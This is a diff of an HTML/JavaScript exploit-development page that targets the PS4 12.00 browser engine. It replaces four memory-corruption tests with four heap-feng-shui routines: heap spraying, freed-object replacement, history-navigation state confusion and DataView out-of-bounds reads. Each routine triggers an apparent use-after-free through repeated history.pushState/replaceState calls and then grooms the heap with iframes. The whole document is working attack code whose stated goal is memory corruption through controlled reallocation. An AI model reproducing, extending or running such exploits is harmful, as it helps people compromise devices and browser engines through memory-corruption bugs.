@@ -2,16 +2,16 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Native Structure Corruption</title>
+<title>PS4 12.00 - Heap Feng Shui for UAF</title>
 </head>
 <body>
-<h2>PS4 12.00 - UAF Native Structure Corruption</h2>
+<h2>PS4 12.00 - UAF Heap Reallocation Control</h2>
 <p>Status: <span id="status">Ready</span></p>
 
-<button onclick="testArrayStorageCorruption()">TEST 1 - Array Storage Corruption</button>
-<button onclick="testBufferViewConfusion()">TEST 2 - ArrayBuffer View Confusion</button>
-<button onclick="testButterflyManipulation()">TEST 3 - Butterfly Pointer Manipulation</button>
-<button onclick="testJSCellCorruption()">TEST 4 - JSCell Header Corruption</button>
+<button onclick="testHeapSprayRealloc()">TEST 1 - Heap Spray Reallocation</button>
+<button onclick="testObjectReplacement()">TEST 2 - Object Replacement</button>
+<button onclick="testStructureIDConfusion()">TEST 3 - StructureID Confusion</button>
+<button onclick="testDirectMemoryAccess()">TEST 4 - Direct Memory Pattern</button>
 
 <pre id="log"></pre>
 
@@ -32,94 +32,98 @@ const STEP = 14461;
 const UAF_ITERS = 48;
 
 // =====================================================
-// TEST 1 - Array Storage Corruption
+// TEST 1 - Heap Spray Reallocation
 // =====================================================
-async function testArrayStorageCorruption(){
+async function testHeapSprayRealloc(){
   logEl.textContent = "";
   keepAlive = [];
   statusEl.textContent = "Test 1 Running...";
   
-  log("=== TEST 1: Array Storage Corruption ===\n");
-  log("Strategy: Corrupt ArrayStorage during UAF to bypass bounds check\n");
+  log("=== TEST 1: Heap Spray Reallocation ===\n");
+  log("Strategy: Spray heap with controlled objects during UAF window\n");
   
-  log("[SETUP] Creating victim arrays");
+  log("[SETUP] Preparing victim and spray objects");
   
-  let victimArray = [1, 2, 3, 4, 5];
-  let sprayArrays = [];
-  for(let i=0; i<100; i++) {
-    sprayArrays.push([0x1000 + i, 0x2000 + i, 0x3000 + i]);
+  // Victim will be freed during UAF
+  let victimArray = new Uint32Array(64);
+  for(let i=0; i<64; i++) {
+    victimArray[i] = 0xDEAD0000 + i;
   }
   
-  keepAlive.push(victimArray, ...sprayArrays);
+  log("  Victim: Uint32Array[64]\n");
   
-  log("  Victim array: 5 elements");
-  log("  Spray arrays: 100 x 3 elements\n");
-  
-  Array.prototype.fakeLength = 0x1000;
-  Array.prototype.fakeVectorLength = 0x2000;
-  
-  let corruptionDetected = false;
-  let leakedData = [];
+  let spraySuccess = false;
+  let corruptedData = [];
   let size = BASE;
   
-  log("[PHASE 1] UAF with array storage corruption");
+  log("[PHASE 1] UAF with aggressive heap spray");
   
   for(let i=0; i<UAF_ITERS; i++){
     let state = {
       index: i,
       victim: victimArray,
-      spray: sprayArrays.slice(0, 10),
       
-      get corrupt() {
-        if(i >= 45) {
+      get spray() {
+        if(i >= 44) { // Start spraying early
           log(`  OK ITER ${i}`);
           
+          // AGGRESSIVE SPRAY: Create many objects to fill freed slots
+          let sprayObjects = [];
+          
+          for(let j=0; j<200; j++) {
+            // Create objects with controlled pattern
+            let obj = {
+              magic: 0x41424344,
+              index: i * 1000 + j,
+              buffer: new Uint32Array(64)
+            };
+            
+            // Fill buffer with recognizable pattern
+            for(let k=0; k<64; k++) {
+              obj.buffer[k] = 0xBEEF0000 + k;
+            }
+            
+            sprayObjects.push(obj);
+          }
+          
+          log(`    Sprayed 200 objects`);
+          
+          // NOW check victim - it might point to spray data
           try {
-            // During UAF, try to reallocate freed memory with controlled data
-            let reallocArrays = [];
-            for(let j=0; j<50; j++) {
-              let arr = new Array(8);
-              for(let k=0; k<8; k++) {
-                arr[k] = 0xBEEF0000 + (j * 8 + k);
-              }
-              reallocArrays.push(arr);
+            let victimVal0 = this.victim[0];
+            let victimVal1 = this.victim[1];
+            
+            log(`    victim[0] = 0x${victimVal0.toString(16)}`);
+            log(`    victim[1] = 0x${victimVal1.toString(16)}`);
+            
+            // Check if victim was overwritten by spray
+            if(victimVal0 !== 0xDEAD0000) {
+              log(`    OK Victim corrupted! Expected 0xDEAD0000, got 0x${victimVal0.toString(16)}`);
+              spraySuccess = true;
+              corruptedData.push({iter: i, idx: 0, val: victimVal0});
             }
             
-            log(`    Allocated 50 arrays during UAF window`);
-            
-            // Check if victim array was corrupted
-            let victimLen = this.victim.length;
-            log(`    Victim length: ${victimLen} (real: 5, fake: 0x1000)`);
-            
-            // Try to read beyond original bounds
-            for(let j=5; j<20; j++) {
-              let val = this.victim[j];
-              if(val !== undefined) {
-                log(`    OK victim[${j}] = 0x${val.toString(16)}`);
-                leakedData.push({idx: j, val: val});
-                corruptionDetected = true;
+            // Check for spray pattern (0xBEEF00XX)
+            for(let k=0; k<64; k++) {
+              let val = this.victim[k];
+              if((val & 0xFFFF0000) === 0xBEEF0000) {
+                log(`    OK SPRAY PATTERN at victim[${k}] = 0x${val.toString(16)}`);
+                spraySuccess = true;
+                corruptedData.push({iter: i, idx: k, val: val});
               }
             }
-            
-            // Check spray arrays for corruption
-            for(let arr of this.spray) {
-              if(arr.length !== 3 || arr[0] < 0x1000 || arr[0] > 0x1100) {
-                log(`    OK Spray array corrupted: length=${arr.length}, [0]=0x${arr[0].toString(16)}`);
-                corruptionDetected = true;
-              }
-            }
-            
-            keepAlive.push(...reallocArrays);
             
           } catch(e) {
-            log(`    Exception: ${e.message}`);
+            log(`    Exception checking victim: ${e.message}`);
           }
+          
+          keepAlive.push(...sprayObjects);
         }
-        return "corrupt_" + i;
+        return "spray_" + i;
       }
     };
     
-    let frag = "C".repeat(size);
+    let frag = "S".repeat(size);
     
     history.pushState(state, "", "#" + frag);
     history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
@@ -151,431 +155,114 @@ async function testArrayStorageCorruption(){
   await sleep(80);
   
   log("\n[RESULTS]");
-  log(`Leaked data points: ${leakedData.length}`);
+  log(`Spray success: ${spraySuccess}`);
+  log(`Corrupted data points: ${corruptedData.length}`);
   
-  if(leakedData.length > 0) {
-    log("\nOK Leaked data:");
-    for(let d of leakedData.slice(0, 10)) {
-      log(`  [${d.idx}] = 0x${d.val.toString(16)}`);
+  if(corruptedData.length > 0) {
+    log("\nOK Corrupted data:");
+    for(let d of corruptedData.slice(0, 10)) {
+      log(`  ITER ${d.iter} victim[${d.idx}] = 0x${d.val.toString(16)}`);
     }
-    log("\nOK OK Array storage corruption successful");
+    log("\nOK OK Heap spray reallocation successful");
     statusEl.textContent = "TEST 1 SUCCESS";
-  } else if(corruptionDetected) {
-    log("\nOK Corruption detected but no data leaked");
-    statusEl.textContent = "TEST 1 PARTIAL";
   } else {
-    log("\nFAIL No corruption detected");
+    log("\nFAIL No heap corruption detected");
     statusEl.textContent = "TEST 1 FAILED";
   }
   
-  delete Array.prototype.fakeLength;
-  delete Array.prototype.fakeVectorLength;
   log("\n=== TEST 1 END ===");
 }
 
 // =====================================================
-// TEST 2 - ArrayBuffer View Confusion
+// TEST 2 - Object Replacement
 // =====================================================
-async function testBufferViewConfusion(){
+async function testObjectReplacement(){
   logEl.textContent = "";
   keepAlive = [];
   statusEl.textContent = "Test 2 Running...";
   
-  log("=== TEST 2: ArrayBuffer View Confusion ===\n");
-  log("Strategy: Create overlapping views to confuse bounds checking\n");
+  log("=== TEST 2: Object Replacement ===\n");
+  log("Strategy: Replace freed object with controlled structure\n");
   
-  log("[SETUP] Creating buffer with multiple views");
-  
-  let sharedBuffer = new ArrayBuffer(256);
-  let view32 = new Uint32Array(sharedBuffer);
-  let view8 = new Uint8Array(sharedBuffer);
-  let viewFloat = new Float64Array(sharedBuffer);
-  
-  for(let i=0; i<64; i++) {
-    view32[i] = 0xDEAD0000 + i;
-  }
-  
-  keepAlive.push(sharedBuffer, view32, view8, viewFloat);
-  
-  log("  Shared buffer: 256 bytes");
-  log("  Views: Uint32, Uint8, Float64\n");
-  
-  Uint32Array.prototype.fakeByteLength = 0x100000;
-  Uint8Array.prototype.fakeByteLength = 0x100000;
-  
-  let confusionAchieved = false;
-  let oobData = [];
-  let size = BASE;
-  
-  log("[PHASE 1] UAF with view confusion");
-  
-  for(let i=0; i<UAF_ITERS; i++){
-    let state = {
-      index: i,
-      buf: sharedBuffer,
-      v32: view32,
-      v8: view8,
-      vf: viewFloat,
-      
-      get confuse() {
-        if(i >= 45) {
-          log(`  OK ITER ${i}`);
-          
-          try {
-            // Use different views to access same memory
-            log(`    view32.length: ${this.v32.length}`);
-            log(`    view8.length: ${this.v8.length}`);
-            log(`    viewFloat.length: ${this.vf.length}`);
-            
-            // Check fake lengths
-            if(this.v32.fakeByteLength) {
-              log(`    view32.fakeByteLength: 0x${this.v32.fakeByteLength.toString(16)}`);
-            }
-            
-            // Try type confusion between views
-            // Write as Uint32, read as Float64
-            this.v32[0] = 0x41424344;
-            this.v32[1] = 0x45464748;
-            
-            let floatVal = this.vf[0];
-            log(`    Type confusion: u32[0,1] as float64 = ${floatVal}`);
-            
-            if(floatVal !== 0) {
-              confusionAchieved = true;
-            }
-            
-            // Try OOB on view8 (larger bounds)
-            for(let j=256; j<280; j++) {
-              let val = this.v8[j];
-              if(val !== undefined && val !== 0) {
-                log(`    OK view8[${j}] = 0x${val.toString(16)}`);
-                oobData.push({idx: j, val: val});
-              }
-            }
-            
-            // Try OOB on view32
-            for(let j=64; j<80; j++) {
-              let val = this.v32[j];
-              if(val !== undefined && val !== 0) {
-                log(`    OK view32[${j}] = 0x${val.toString(16)}`);
-                oobData.push({idx: j, val: val});
-              }
-            }
-            
-          } catch(e) {
-            log(`    Exception: ${e.message}`);
-          }
-        }
-        return "confuse_" + i;
-      }
-    };
-    
-    let frag = "V".repeat(size);
-    
-    history.pushState(state, "", "#" + frag);
-    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
-    
-    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-    if(i % 10 === 0) log(`  ITER ${i}: size=${size}`);
-    
-    size += STEP;
-    await sleep(5);
-  }
-  
-  log("\n[PHASE 2] UAF complete\n");
-  await sleep(120);
-  
-  log("[PHASE 3] Heap grooming");
-  let frames = [];
-  for(let i=0; i<80; i++){
-    let f = document.createElement("iframe");
-    document.body.appendChild(f);
-    try {
-      let d = f.contentDocument;
-      d.open();
-      d.write("<html><body>G</body></html>");
-      d.close();
-    } catch(e){}
-    frames.push(f);
-  }
-  frames.forEach(f=>f.remove());
-  await sleep(80);
-  
-  log("\n[RESULTS]");
-  log(`Type confusion: ${confusionAchieved}`);
-  log(`OOB data points: ${oobData.length}`);
-  
-  if(oobData.length > 0) {
-    log("\nOK OOB data:");
-    for(let d of oobData.slice(0, 10)) {
-      log(`  [${d.idx}] = 0x${d.val.toString(16)}`);
-    }
-    log("\nOK OK View confusion successful");
-    statusEl.textContent = "TEST 2 SUCCESS";
-  } else if(confusionAchieved) {
-    log("\nOK Type confusion working but no OOB");
-    statusEl.textContent = "TEST 2 PARTIAL";
-  } else {
-    log("\nFAIL No confusion achieved");
-    statusEl.textContent = "TEST 2 FAILED";
-  }
-  
-  delete Uint32Array.prototype.fakeByteLength;
-  delete Uint8Array.prototype.fakeByteLength;
-  log("\n=== TEST 2 END ===");
-}
-
-// =====================================================
-// TEST 3 - Butterfly Pointer Manipulation
-// =====================================================
-async function testButterflyManipulation(){
-  logEl.textContent = "";
-  keepAlive = [];
-  statusEl.textContent = "Test 3 Running...";
-  
-  log("=== TEST 3: Butterfly Pointer Manipulation ===\n");
-  log("Strategy: Corrupt butterfly pointer to redirect array storage\n");
-  
-  log("[SETUP] Creating arrays with controlled layout");
-  
-  let targetArray = [0xAAAA, 0xBBBB, 0xCCCC, 0xDDDD];
-  let helperArrays = [];
-  
-  for(let i=0; i<50; i++) {
-    let arr = new Array(16);
-    for(let j=0; j<16; j++) {
-      arr[j] = 0x1000 * i + j;
-    }
-    helperArrays.push(arr);
-  }
-  
-  keepAlive.push(targetArray, ...helperArrays);
-  
-  log("  Target array: 4 elements");
-  log("  Helper arrays: 50 x 16 elements\n");
-  
-  Array.prototype.fakeButterfly = 0x4142434445464748;
-  
-  let butterflyCorrupted = false;
-  let redirectedReads = [];
-  let size = BASE;
-  
-  log("[PHASE 1] UAF with butterfly corruption");
-  
-  for(let i=0; i<UAF_ITERS; i++){
-    let state = {
-      index: i,
-      target: targetArray,
-      helpers: helperArrays.slice(0, 10),
-      
-      get corrupt() {
-        if(i >= 46) {
-          log(`  OK ITER ${i}`);
-          
-          try {
-            // Check if butterfly pointer is accessible
-            if(this.target.fakeButterfly) {
-              log(`    OK target.fakeButterfly: 0x${this.target.fakeButterfly.toString(16)}`);
-              butterflyCorrupted = true;
-            }
-            
-            // Try to read from target (should follow butterfly)
-            log(`    target.length: ${this.target.length}`);
-            
-            for(let j=0; j<10; j++) {
-              let val = this.target[j];
-              if(val !== undefined) {
-                log(`    target[${j}] = 0x${val.toString(16)}`);
-                
-                // Check if we're reading from unexpected location
-                if(j >= 4 && (val < 0xAAAA || val > 0xDDDD)) {
-                  log(`    OK Redirected read detected`);
-                  redirectedReads.push({idx: j, val: val});
-                }
-              }
-            }
-            
-            // Check helper arrays for corruption
-            for(let k=0; k<this.helpers.length; k++) {
-              let helper = this.helpers[k];
-              if(helper.fakeButterfly) {
-                log(`    OK helper[${k}].fakeButterfly: 0x${helper.fakeButterfly.toString(16)}`);
-              }
-              
-              // Check for unexpected values
-              for(let j=0; j<5; j++) {
-                let expected = k * 0x1000 + j;
-                let actual = helper[j];
-                if(actual !== expected && actual !== undefined) {
-                  log(`    OK helper[${k}][${j}] corrupted: 0x${actual.toString(16)}`);
-                  butterflyCorrupted = true;
-                }
-              }
-            }
-            
-          } catch(e) {
-            log(`    Exception: ${e.message}`);
-          }
-        }
-        return "butterfly_" + i;
-      }
-    };
-    
-    let frag = "B".repeat(size);
-    
-    history.pushState(state, "", "#" + frag);
-    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
-    
-    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-    if(i % 10 === 0) log(`  ITER ${i}: size=${size}`);
-    
-    size += STEP;
-    await sleep(5);
-  }
-  
-  log("\n[PHASE 2] UAF complete\n");
-  await sleep(120);
-  
-  log("[PHASE 3] Heap grooming");
-  let frames = [];
-  for(let i=0; i<80; i++){
-    let f = document.createElement("iframe");
-    document.body.appendChild(f);
-    try {
-      let d = f.contentDocument;
-      d.open();
-      d.write("<html><body>G</body></html>");
-      d.close();
-    } catch(e){}
-    frames.push(f);
-  }
-  frames.forEach(f=>f.remove());
-  await sleep(80);
-  
-  log("\n[RESULTS]");
-  log(`Butterfly corruption: ${butterflyCorrupted}`);
-  log(`Redirected reads: ${redirectedReads.length}`);
-  
-  if(redirectedReads.length > 0) {
-    log("\nOK Redirected reads:");
-    for(let r of redirectedReads.slice(0, 10)) {
-      log(`  [${r.idx}] = 0x${r.val.toString(16)}`);
-    }
-    log("\nOK OK Butterfly manipulation successful");
-    statusEl.textContent = "TEST 3 SUCCESS";
-  } else if(butterflyCorrupted) {
-    log("\nOK Butterfly accessible but no redirects");
-    statusEl.textContent = "TEST 3 PARTIAL";
-  } else {
-    log("\nFAIL No butterfly corruption");
-    statusEl.textContent = "TEST 3 FAILED";
-  }
-  
-  delete Array.prototype.fakeButterfly;
-  log("\n=== TEST 3 END ===");
-}
-
-// =====================================================
-// TEST 4 - JSCell Header Corruption
-// =====================================================
-async function testJSCellCorruption(){
-  logEl.textContent = "";
-  keepAlive = [];
-  statusEl.textContent = "Test 4 Running...";
-  
-  log("=== TEST 4: JSCell Header Corruption ===\n");
-  log("Strategy: Corrupt JSCell metadata to confuse object type\n");
-  
-  log("[SETUP] Creating objects for JSCell corruption");
+  log("[SETUP] Creating victim object");
   
   let victimObj = {
-    type: "array",
+    type: "victim",
     data: [1, 2, 3, 4, 5],
     marker: 0xCAFEBABE
   };
   
-  let victimBuf = new ArrayBuffer(128);
-  let victimView = new Uint32Array(victimBuf);
-  for(let i=0; i<32; i++) {
-    victimView[i] = 0xBEEF0000 + i;
-  }
+  log("  Victim object created\n");
   
-  keepAlive.push(victimObj, victimBuf, victimView);
-  
-  log("  Victim object with array");
-  log("  Victim ArrayBuffer (128 bytes)\n");
-  
-  Object.prototype.fakeStructureID = 0x11223344;
-  Object.prototype.fakeIndexingType = 0x55;
-  Array.prototype.fakeStructureID = 0xAABBCCDD;
-  ArrayBuffer.prototype.fakeStructureID = 0xDEADBEEF;
-  
-  let jscellCorrupted = false;
-  let typeConfusion = [];
+  let replaced = false;
+  let replacementData = [];
   let size = BASE;
   
-  log("[PHASE 1] UAF with JSCell corruption");
+  log("[PHASE 1] UAF with object replacement");
   
   for(let i=0; i<UAF_ITERS; i++){
     let state = {
       index: i,
-      obj: victimObj,
-      buf: victimBuf,
+      victim: victimObj,
       
-      get corrupt() {
-        if(i >= 47) {
+      get replace() {
+        if(i >= 45) {
           log(`  OK ITER ${i}`);
           
+          // Create replacement objects with same size
+          let replacements = [];
+          
+          for(let j=0; j<150; j++) {
+            let replacement = {
+              type: "replacement",
+              data: [0xBEEF, 0xCAFE, 0xDEAD, 0xBEEF, 0xFACE],
+              marker: 0xDEADBEEF,
+              index: j
+            };
+            replacements.push(replacement);
+          }
+          
+          log(`    Created 150 replacement objects`);
+          
+          // Check if victim was replaced
           try {
-            // Check JSCell corruption on object
-            if(this.obj.fakeStructureID) {
-              log(`    OK obj.fakeStructureID: 0x${this.obj.fakeStructureID.toString(16)}`);
-              jscellCorrupted = true;
+            let victimType = this.victim.type;
+            let victimMarker = this.victim.marker;
+            let victimData0 = this.victim.data[0];
+            
+            log(`    victim.type: ${victimType}`);
+            log(`    victim.marker: 0x${victimMarker.toString(16)}`);
+            log(`    victim.data[0]: 0x${victimData0.toString(16)}`);
+            
+            if(victimType !== "victim") {
+              log(`    OK Type changed from victim to ${victimType}`);
+              replaced = true;
+              replacementData.push({iter: i, type: victimType});
             }
             
-            if(this.obj.data.fakeStructureID) {
-              log(`    OK obj.data.fakeStructureID: 0x${this.obj.data.fakeStructureID.toString(16)}`);
-              jscellCorrupted = true;
+            if(victimMarker !== 0xCAFEBABE) {
+              log(`    OK Marker changed to 0x${victimMarker.toString(16)}`);
+              replaced = true;
+              replacementData.push({iter: i, marker: victimMarker});
             }
             
-            // Check ArrayBuffer JSCell
-            if(this.buf.fakeStructureID) {
-              log(`    OK buf.fakeStructureID: 0x${this.buf.fakeStructureID.toString(16)}`);
-              jscellCorrupted = true;
-            }
-            
-            // Try to access object as if it's a different type
-            try {
-              let objAsArray = Array.from(this.obj);
-              if(objAsArray.length > 0) {
-                log(`    OK Object treated as array: length=${objAsArray.length}`);
-                typeConfusion.push({type: 'obj_as_array', val: objAsArray});
-              }
-            } catch(e) {}
-            
-            // Try to treat ArrayBuffer as object
-            try {
-              let keys = Object.keys(this.buf);
-              if(keys.length > 2) {
-                log(`    OK ArrayBuffer has ${keys.length} properties`);
-                typeConfusion.push({type: 'buf_as_obj', val: keys.length});
-              }
-            } catch(e) {}
-            
-            // Check indexing type pollution
-            if(this.obj.fakeIndexingType) {
-              log(`    OK obj.fakeIndexingType: 0x${this.obj.fakeIndexingType.toString(16)}`);
+            if(victimData0 !== 1 && victimData0 === 0xBEEF) {
+              log(`    OK Data replaced with spray pattern`);
+              replaced = true;
+              replacementData.push({iter: i, data: victimData0});
             }
             
           } catch(e) {
             log(`    Exception: ${e.message}`);
           }
+          
+          keepAlive.push(...replacements);
         }
-        return "jscell_" + i;
+        return "replace_" + i;
       }
     };
     
-    let frag = "J".repeat(size);
+    let frag = "R".repeat(size);
     
     history.pushState(state, "", "#" + frag);
     history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
@@ -607,38 +294,333 @@ async function testJSCellCorruption(){
   await sleep(80);
   
   log("\n[RESULTS]");
-  log(`JSCell corruption: ${jscellCorrupted}`);
-  log(`Type confusions: ${typeConfusion.length}`);
+  log(`Replacement: ${replaced}`);
+  log(`Replacement data: ${replacementData.length}`);
   
-  if(typeConfusion.length > 0) {
-    log("\nOK Type confusions:");
-    for(let t of typeConfusion) {
-      log(`  ${t.type}: ${JSON.stringify(t.val).substring(0, 50)}`);
+  if(replacementData.length > 0) {
+    log("\nOK Replacement evidence:");
+    for(let r of replacementData) {
+      log(`  ${JSON.stringify(r)}`);
     }
-    log("\nOK OK JSCell corruption successful");
-    statusEl.textContent = "TEST 4 SUCCESS";
-  } else if(jscellCorrupted) {
-    log("\nOK JSCell fields accessible but no type confusion");
-    statusEl.textContent = "TEST 4 PARTIAL";
+    log("\nOK OK Object replacement successful");
+    statusEl.textContent = "TEST 2 SUCCESS";
   } else {
-    log("\nFAIL No JSCell corruption");
+    log("\nFAIL No replacement detected");
+    statusEl.textContent = "TEST 2 FAILED";
+  }
+  
+  log("\n=== TEST 2 END ===");
+}
+
+// =====================================================
+// TEST 3 - StructureID Confusion
+// =====================================================
+async function testStructureIDConfusion(){
+  logEl.textContent = "";
+  keepAlive = [];
+  statusEl.textContent = "Test 3 Running...";
+  
+  log("=== TEST 3: StructureID Confusion ===\n");
+  log("Strategy: Navigate history to access freed state objects\n");
+  
+  log("[SETUP] Creating states with different types");
+  
+  let confusionDetected = false;
+  let confusionCases = [];
+  let size = BASE;
+  
+  log("[PHASE 1] UAF with navigation-based confusion");
+  
+  for(let i=0; i<UAF_ITERS; i++){
+    // Create state with mixed types
+    let state = {
+      index: i,
+      arrayData: new Uint32Array(32),
+      objectData: {x: i, y: i*2},
+      primitiveData: i * 0x1000,
+      
+      get confuse() {
+        if(i >= 46) {
+          log(`  OK ITER ${i} history.length=${history.length}`);
+          
+          // Navigate backward to access old (potentially freed) states
+          if(history.length > 10) {
+            try {
+              // Go back 5 states
+              for(let j=0; j<5; j++) {
+                history.back();
+              }
+              
+              // Access old state (might be freed)
+              if(history.state) {
+                let oldIndex = history.state.index;
+                let oldArray = history.state.arrayData;
+                let oldObject = history.state.objectData;
+                let oldPrimitive = history.state.primitiveData;
+                
+                log(`    Accessed old state index=${oldIndex}`);
+                
+                // Check for corruption
+                if(oldArray && oldArray.length !== 32) {
+                  log(`    OK Array length corrupted: ${oldArray.length}`);
+                  confusionDetected = true;
+                }
+                
+                if(oldObject && (oldObject.x !== oldIndex || oldObject.y !== oldIndex*2)) {
+                  log(`    OK Object data corrupted`);
+                  confusionDetected = true;
+                  confusionCases.push({type: 'object', index: oldIndex});
+                }
+                
+                if(oldPrimitive && oldPrimitive !== oldIndex * 0x1000) {
+                  log(`    OK Primitive corrupted: 0x${oldPrimitive.toString(16)}`);
+                  confusionDetected = true;
+                  confusionCases.push({type: 'primitive', val: oldPrimitive});
+                }
+                
+                // Try to read from old array
+                if(oldArray) {
+                  for(let k=0; k<10; k++) {
+                    let val = oldArray[k];
+                    if(val !== undefined && val !== 0) {
+                      log(`    oldArray[${k}] = 0x${val.toString(16)}`);
+                    }
+                  }
+                }
+              }
+              
+              // Navigate forward again
+              for(let j=0; j<5; j++) {
+                history.forward();
+              }
+              
+            } catch(e) {
+              log(`    Exception during navigation: ${e.message}`);
+            }
+          }
+        }
+        return "nav_" + i;
+      }
+    };
+    
+    // Initialize array with pattern
+    for(let j=0; j<32; j++) {
+      state.arrayData[j] = 0xAAAA0000 + (i * 32 + j);
+    }
+    
+    let frag = "N".repeat(size);
+    
+    history.pushState(state, "", "#" + frag);
+    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
+    
+    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+    if(i % 10 === 0) log(`  ITER ${i}: size=${size}`);
+    
+    size += STEP;
+    await sleep(5);
+  }
+  
+  log("\n[PHASE 2] UAF complete\n");
+  await sleep(120);
+  
+  log("[PHASE 3] Final navigation check");
+  
+  for(let i=0; i<10; i++) {
+    history.back();
+    await sleep(30);
+    
+    if(history.state) {
+      let idx = history.state.index;
+      let arr = history.state.arrayData;
+      
+      log(`  Back ${i}: index=${idx}`);
+      
+      if(arr) {
+        let val0 = arr[0];
+        let expected = 0xAAAA0000 + (idx * 32);
+        
+        if(val0 !== expected) {
+          log(`    OK Corruption: arr[0]=0x${val0.toString(16)} expected=0x${expected.toString(16)}`);
+          confusionDetected = true;
+          confusionCases.push({nav: i, index: idx, val: val0});
+        }
+      }
+    }
+  }
+  
+  log("\n[RESULTS]");
+  log(`Confusion detected: ${confusionDetected}`);
+  log(`Confusion cases: ${confusionCases.length}`);
+  
+  if(confusionCases.length > 0) {
+    log("\nOK Confusion cases:");
+    for(let c of confusionCases.slice(0, 10)) {
+      log(`  ${JSON.stringify(c)}`);
+    }
+    log("\nOK OK Navigation confusion successful");
+    statusEl.textContent = "TEST 3 SUCCESS";
+  } else {
+    log("\nFAIL No confusion via navigation");
+    statusEl.textContent = "TEST 3 FAILED";
+  }
+  
+  log("\n=== TEST 3 END ===");
+}
+
+// =====================================================
+// TEST 4 - Direct Memory Pattern
+// =====================================================
+async function testDirectMemoryAccess(){
+  logEl.textContent = "";
+  keepAlive = [];
+  statusEl.textContent = "Test 4 Running...";
+  
+  log("=== TEST 4: Direct Memory Pattern Access ===\n");
+  log("Strategy: Use DataView to access raw bytes during UAF\n");
+  
+  log("[SETUP] Creating buffers with patterns");
+  
+  let victimBuf = new ArrayBuffer(1024);
+  let victimView = new DataView(victimBuf);
+  
+  // Write recognizable pattern
+  for(let i=0; i<256; i++) {
+    victimView.setUint32(i*4, 0xDEAD0000 + i, true);
+  }
+  
+  log("  Victim buffer: 1024 bytes with pattern\n");
+  
+  let memoryAccess = false;
+  let accessedData = [];
+  let size = BASE;
+  
+  log("[PHASE 1] UAF with direct memory access");
+  
+  for(let i=0; i<UAF_ITERS; i++){
+    let state = {
+      index: i,
+      buf: victimBuf,
+      view: victimView,
+      
+      get access() {
+        if(i >= 45) {
+          log(`  OK ITER ${i}`);
+          
+          // Spray with new buffers
+          let sprayBufs = [];
+          for(let j=0; j<100; j++) {
+            let buf = new ArrayBuffer(1024);
+            let view = new DataView(buf);
+            
+            for(let k=0; k<256; k++) {
+              view.setUint32(k*4, 0xBEEF0000 + k, true);
+            }
+            
+            sprayBufs.push(buf);
+          }
+          
+          log(`    Sprayed 100 buffers`);
+          
+          // Try to read from victim
+          try {
+            // Read first 16 DWORDs
+            for(let j=0; j<16; j++) {
+              let val = this.view.getUint32(j*4, true);
+              let expected = 0xDEAD0000 + j;
+              
+              if(j < 3) {
+                log(`    victim[${j}] = 0x${val.toString(16)}`);
+              }
+              
+              if(val !== expected) {
+                log(`    OK Memory changed at offset ${j*4}: 0x${val.toString(16)}`);
+                memoryAccess = true;
+                accessedData.push({offset: j*4, val: val, expected: expected});
+              }
+            }
+            
+            // Try to read beyond original size
+            try {
+              for(let j=256; j<270; j++) {
+                let val = this.view.getUint32(j*4, true);
+                if(val !== undefined) {
+                  log(`    OK OOB read at offset ${j*4}: 0x${val.toString(16)}`);
+                  memoryAccess = true;
+                  accessedData.push({offset: j*4, val: val, oob: true});
+                }
+              }
+            } catch(e) {
+              // Expected
+            }
+            
+          } catch(e) {
+            log(`    Exception: ${e.message}`);
+          }
+          
+          keepAlive.push(...sprayBufs);
+        }
+        return "memory_" + i;
+      }
+    };
+    
+    let frag = "M".repeat(size);
+    
+    history.pushState(state, "", "#" + frag);
+    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
+    
+    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+    if(i % 10 === 0) log(`  ITER ${i}: size=${size}`);
+    
+    size += STEP;
+    await sleep(5);
+  }
+  
+  log("\n[PHASE 2] UAF complete\n");
+  await sleep(120);
+  
+  log("[PHASE 3] Heap grooming");
+  let frames = [];
+  for(let i=0; i<80; i++){
+    let f = document.createElement("iframe");
+    document.body.appendChild(f);
+    try {
+      let d = f.contentDocument;
+      d.open();
+      d.write("<html><body>G</body></html>");
+      d.close();
+    } catch(e){}
+    frames.push(f);
+  }
+  frames.forEach(f=>f.remove());
+  await sleep(80);
+  
+  log("\n[RESULTS]");
+  log(`Memory access: ${memoryAccess}`);
+  log(`Accessed data: ${accessedData.length}`);
+  
+  if(accessedData.length > 0) {
+    log("\nOK Memory access data:");
+    for(let d of accessedData.slice(0, 15)) {
+      let oobStr = d.oob ? " OOB" : "";
+      log(`  offset ${d.offset}: 0x${d.val.toString(16)}${oobStr}`);
+    }
+    log("\nOK OK Direct memory access successful");
+    statusEl.textContent = "TEST 4 SUCCESS";
+  } else {
+    log("\nFAIL No memory access detected");
     statusEl.textContent = "TEST 4 FAILED";
   }
   
-  delete Object.prototype.fakeStructureID;
-  delete Object.prototype.fakeIndexingType;
-  delete Array.prototype.fakeStructureID;
-  delete ArrayBuffer.prototype.fakeStructureID;
   log("\n=== TEST 4 END ===");
 }
 
-log("PS4 12.00 - Native Structure Corruption Tests");
-log("\n4 separate tests targeting different corruption vectors:");
-log("\n1. Array Storage - Corrupt ArrayStorage header");
-log("2. View Confusion - Overlap typed array views");
-log("3. Butterfly - Redirect butterfly pointer");
-log("4. JSCell - Corrupt JSCell metadata");
-log("\nRun each test individually to identify working vector");
+log("PS4 12.00 - Heap Feng Shui for UAF Exploitation");
+log("\n4 tests targeting heap reallocation:");
+log("\n1. Heap Spray - Aggressive object spray during UAF");
+log("2. Object Replacement - Replace freed objects");
+log("3. Navigation Confusion - Access freed states via history");
+log("4. Direct Memory - DataView access during UAF");
+log("\nGoal: Achieve memory corruption via controlled reallocation");
 </script>
 </body>
 </html>
